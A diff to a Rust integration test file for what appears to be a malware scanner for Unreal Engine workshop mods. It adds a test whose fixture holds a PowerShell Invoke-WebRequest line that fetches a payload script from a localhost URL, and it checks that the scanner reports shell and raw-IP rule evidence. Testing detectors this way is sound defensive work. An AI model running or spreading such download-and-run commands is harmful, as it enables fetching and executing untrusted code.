@@ -67,7 +67,7 @@ fn writes_a_versioned_profile_aware_report_to_a_file() {
     assert!(output.stdout.is_empty());
     let value: serde_json::Value =
         serde_json::from_slice(&std::fs::read(&report).unwrap()).unwrap();
-    assert_eq!(value["schema_version"], 1);
+    assert_eq!(value["schema_version"], 2);
     assert_eq!(value["game_profile"]["id"], "meccha-chameleon");
     assert_eq!(value["game_profile"]["steam_app_id"], 4_704_690);
 
@@ -115,6 +115,32 @@ fn writes_summary_format_to_a_file_without_json() {
     assert!(output.stdout.is_empty());
     assert!(text.starts_with("block: yes\nverdict: incomplete\n"));
     assert!(!text.trim_start().starts_with('{'));
+
+    std::fs::remove_dir_all(fixture).unwrap();
+}
+
+#[test]
+fn summary_includes_exact_rule_evidence() {
+    let fixture =
+        std::env::temp_dir().join(format!("uews-summary-evidence-{}", std::process::id()));
+    std::fs::create_dir_all(&fixture).unwrap();
+    std::fs::write(
+        fixture.join("payload.ps1"),
+        "powershell Invoke-WebRequest https://127.0.0.1/payload.cmd",
+    )
+    .unwrap();
+
+    let output = Command::new(env!("CARGO_BIN_EXE_ue-workshop-scanner"))
+        .arg(&fixture)
+        .arg("--summary")
+        .output()
+        .expect("scanner process should start");
+    let stdout = String::from_utf8_lossy(&output.stdout);
+
+    assert_eq!(output.status.code(), Some(3));
+    assert!(stdout.contains("location: payload.ps1"));
+    assert!(stdout.contains("evidence: [process-shell] \"powershell\" at byte 0 (ascii)"));
+    assert!(stdout.contains("evidence: [raw-ip-url] \"https://127.0.0.1\""));
 
     std::fs::remove_dir_all(fixture).unwrap();
 }
